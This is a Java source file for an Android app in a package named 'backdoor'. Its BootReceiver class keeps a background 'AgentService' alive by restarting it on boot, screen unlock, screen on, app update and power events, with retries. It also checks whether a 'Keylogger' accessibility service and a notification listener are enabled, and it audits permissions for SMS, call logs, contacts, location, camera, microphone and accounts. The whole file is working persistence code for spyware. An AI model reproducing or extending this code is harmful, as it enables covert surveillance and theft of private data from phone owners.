package com.lazyframework.backdoor;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Handler;
import android.os.Looper;
import android.provider.Settings;
import android.util.Log;

public class BootReceiver extends BroadcastReceiver {
    private static final String TAG = "LazyFramework";
    private static final int DELAY_START_MS = 3000; // 3 detik delay setelah boot
    private static final int MAX_RETRY = 5;
    private static int retryCount = 0;
    
    @Override
    public void onReceive(Context context, Intent intent) {
        if (intent == null || intent.getAction() == null) {
            return;
        }
        
        Log.d(TAG, "📱 BootReceiver triggered");
        Log.d(TAG, "   Action: " + intent.getAction());
        Log.d(TAG, "   Package: " + context.getPackageName());
        
        String action = intent.getAction();
        
        // ============ HANDLE BOOT COMPLETED ============
        if (action.equals(Intent.ACTION_BOOT_COMPLETED) ||
            action.equals(Intent.ACTION_QUICKBOOT_POWERON) ||
            action.equals(Intent.ACTION_REBOOT) ||
            action.equals("android.intent.action.ACTION_BOOT_COMPLETED")) {
            
            Log.d(TAG, "📱 Device boot detected, starting service...");
            startAllServices(context);
        }
        
        // ============ HANDLE USER PRESENT (Screen Unlock) ============
        else if (action.equals(Intent.ACTION_USER_PRESENT)) {
            Log.d(TAG, "👤 User present, checking services...");
            // Jika service belum running, start ulang
            if (!isServiceRunning(context)) {
                Log.d(TAG, "🔄 Service not running, starting...");
                startAllServices(context);
            }
        }
        
        // ============ HANDLE PACKAGE REPLACED (Update) ============
        else if (action.equals(Intent.ACTION_PACKAGE_REPLACED) ||
                 action.equals(Intent.ACTION_MY_PACKAGE_REPLACED)) {
            String packageName = intent.getData() != null ? 
                intent.getData().getSchemeSpecificPart() : "";
            
            if (packageName.equals(context.getPackageName())) {
                Log.d(TAG, "📦 App updated, restarting services...");
                startAllServicesWithDelay(context, 1000);
            }
        }
        
        // ============ HANDLE SCREEN ON ============
        else if (action.equals(Intent.ACTION_SCREEN_ON)) {
            Log.d(TAG, "💡 Screen on, checking service status");
            if (!isServiceRunning(context)) {
                Log.d(TAG, "🔄 Service not running, starting...");
                startAllServices(context);
            }
        }
    }
    
    // ==================== START ALL SERVICES ====================
    
    private void startAllServices(Context context) {
        startAllServicesWithDelay(context, DELAY_START_MS);
    }
    
    private void startAllServicesWithDelay(Context context, long delayMs) {
        Handler handler = new Handler(Looper.getMainLooper());
        handler.postDelayed(() -> {
            try {
                Log.d(TAG, "🚀 Starting services after " + delayMs + "ms delay");
                
                // 1. Start AgentService
                startAgentService(context);
                
                // 2. Start Keylogger (via Accessibility - user must enable manually)
                // Accessibility service cannot be started programmatically,
                // but we can check and notify if not enabled
                checkAccessibilityService(context);
                
                // 3. Start Notification Listener (user must enable manually)
                checkNotificationListener(context);
                
                // 4. Request permissions if needed
                checkPermissions(context);
                
                // Reset retry counter
                retryCount = 0;
                
                Log.d(TAG, "✅ All services started successfully");
                
            } catch (Exception e) {
                Log.e(TAG, "❌ Error starting services: " + e.getMessage());
                
                // Retry jika gagal
                retryCount++;
                if (retryCount < MAX_RETRY) {
                    Log.d(TAG, "🔄 Retry " + retryCount + "/" + MAX_RETRY);
                    startAllServicesWithDelay(context, 5000);
                } else {
                    Log.e(TAG, "❌ Max retry reached, giving up");
                }
            }
        }, delayMs);
    }
    
    // ==================== START AGENT SERVICE ====================
    
    private void startAgentService(Context context) {
        try {
            Intent serviceIntent = new Intent(context, AgentService.class);
            serviceIntent.putExtra("source", "BootReceiver");
            serviceIntent.putExtra("timestamp", System.currentTimeMillis());
            
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                context.startForegroundService(serviceIntent);
                Log.d(TAG, "✅ Foreground service started (Android 8+)");
            } else {
                context.startService(serviceIntent);
                Log.d(TAG, "✅ Service started");
            }
        } catch (Exception e) {
            Log.e(TAG, "❌ Error starting AgentService: " + e.getMessage());
            throw e;
        }
    }
    
    // ==================== CHECK SERVICE RUNNING ====================
    
    private boolean isServiceRunning(Context context) {
        try {
            android.app.ActivityManager manager = 
                (android.app.ActivityManager) context.getSystemService(Context.ACTIVITY_SERVICE);
            
            if (manager == null) return false;
            
            for (android.app.ActivityManager.RunningServiceInfo service : 
                    manager.getRunningServices(Integer.MAX_VALUE)) {
                if (AgentService.class.getName().equals(service.service.getClassName())) {
                    return true;
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "Error checking service: " + e.getMessage());
        }
        return false;
    }
    
    // ==================== CHECK ACCESSIBILITY SERVICE ====================
    
    private void checkAccessibilityService(Context context) {
        try {
            String enabledServices = Settings.Secure.getString(
                context.getContentResolver(),
                Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
            );
            
            String packageName = context.getPackageName();
            String serviceName = packageName + "/" + KeyloggerHelper.class.getName();
            
            if (enabledServices != null && enabledServices.contains(serviceName)) {
                Log.d(TAG, "✅ Keylogger accessibility service is enabled");
            } else {
                Log.d(TAG, "⚠️ Keylogger accessibility service is NOT enabled");
                Log.d(TAG, "   User needs to enable: Settings → Accessibility → Keylogger Service");
                // Notify user (optional)
                // notifyUserToEnableAccessibility(context);
            }
        } catch (Exception e) {
            Log.e(TAG, "Error checking accessibility: " + e.getMessage());
        }
    }
    
    // ==================== CHECK NOTIFICATION LISTENER ====================
    
    private void checkNotificationListener(Context context) {
        try {
            String enabledListeners = Settings.Secure.getString(
                context.getContentResolver(),
                Settings.Secure.ENABLED_NOTIFICATION_LISTENERS
            );
            
            String packageName = context.getPackageName();
            
            if (enabledListeners != null && enabledListeners.contains(packageName)) {
                Log.d(TAG, "✅ Notification listener is enabled");
            } else {
                Log.d(TAG, "⚠️ Notification listener is NOT enabled");
                Log.d(TAG, "   User needs to enable: Settings → Notification Access → LazyAgent");
                // Notify user (optional)
                // notifyUserToEnableNotification(context);
            }
        } catch (Exception e) {
            Log.e(TAG, "Error checking notification listener: " + e.getMessage());
        }
    }
    
    // ==================== CHECK PERMISSIONS ====================
    
    private void checkPermissions(Context context) {
        try {
            String[] permissions = {
                android.Manifest.permission.INTERNET,
                android.Manifest.permission.ACCESS_FINE_LOCATION,
                android.Manifest.permission.ACCESS_COARSE_LOCATION,
                android.Manifest.permission.READ_EXTERNAL_STORAGE,
                android.Manifest.permission.WRITE_EXTERNAL_STORAGE,
                android.Manifest.permission.READ_CONTACTS,
                android.Manifest.permission.READ_SMS,
                android.Manifest.permission.READ_CALL_LOG,
                android.Manifest.permission.RECORD_AUDIO,
                android.Manifest.permission.CAMERA,
                android.Manifest.permission.GET_ACCOUNTS
            };
            
            int granted = 0;
            int denied = 0;
            
            for (String permission : permissions) {
                if (context.checkCallingOrSelfPermission(permission) == 
                        PackageManager.PERMISSION_GRANTED) {
                    granted++;
                } else {
                    denied++;
                }
            }
            
            Log.d(TAG, "📊 Permission status: " + granted + " granted, " + denied + " denied");
            
            if (denied > 0) {
                Log.d(TAG, "⚠️ Some permissions are missing: " + denied + " permissions");
                // User needs to grant permissions manually
                // We can't request permissions from BroadcastReceiver
            }
        } catch (Exception e) {
            Log.e(TAG, "Error checking permissions: " + e.getMessage());
        }
    }
    
    // ==================== NOTIFY USER (Optional) ====================
    
    private void notifyUserToEnableAccessibility(Context context) {
        try {
            Intent intent = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
            intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            context.startActivity(intent);
            Log.d(TAG, "🔔 Opened Accessibility Settings for user");
        } catch (Exception e) {
            Log.e(TAG, "Error opening accessibility settings: " + e.getMessage());
        }
    }
    
    private void notifyUserToEnableNotification(Context context) {
        try {
            Intent intent = new Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS);
            intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            context.startActivity(intent);
            Log.d(TAG, "🔔 Opened Notification Settings for user");
        } catch (Exception e) {
            Log.e(TAG, "Error opening notification settings: " + e.getMessage());
        }
    }
    
    // ==================== SETTINGS PAGE REDIRECT ====================
    
    // Untuk membuka halaman settings aplikasi
    private void openAppSettings(Context context) {
        try {
            Intent intent = new Intent(
                Settings.ACTION_APPLICATION_DETAILS_SETTINGS,
                android.net.Uri.parse("package:" + context.getPackageName())
            );
            intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            context.startActivity(intent);
        } catch (Exception e) {
            Log.e(TAG, "Error opening app settings: " + e.getMessage());
        }
    }
    
    // ==================== SCHEDULE SERVICE RESTART ====================
    
    // Menjadwalkan restart service (untuk memastikan service tetap berjalan)
    public void scheduleServiceRestart(Context context) {
        try {
            Handler handler = new Handler(Looper.getMainLooper());
            handler.postDelayed(() -> {
                if (!isServiceRunning(context)) {
                    Log.d(TAG, "🔄 Scheduled restart: Service not running, starting...");
                    startAllServices(context);
                } else {
                    Log.d(TAG, "✅ Scheduled check: Service is running");
                }
            }, 30000); // Check every 30 seconds
        } catch (Exception e) {
            Log.e(TAG, "Error scheduling restart: " + e.getMessage());
        }
    }
    
    // ==================== HANDLE OTHER EVENTS ====================
    
    // TIME_TICK - bisa digunakan untuk periodic check
    public void handleTimeTick(Context context) {
        // Periodic check every minute
        if (!isServiceRunning(context)) {
            Log.d(TAG, "🔄 TimeTick: Service not running, starting...");
            startAllServices(context);
        }
    }
    
    // ==================== POWER CONNECTED/DISCONNECTED ====================
    
    public void handlePowerConnected(Context context) {
        Log.d(TAG, "🔌 Power connected - checking services");
        if (!isServiceRunning(context)) {
            startAllServices(context);
        }
    }
    
    public void handlePowerDisconnected(Context context) {
        Log.d(TAG, "🔋 Power disconnected - checking services");
        if (!isServiceRunning(context)) {
            startAllServices(context);
        }
    }
}
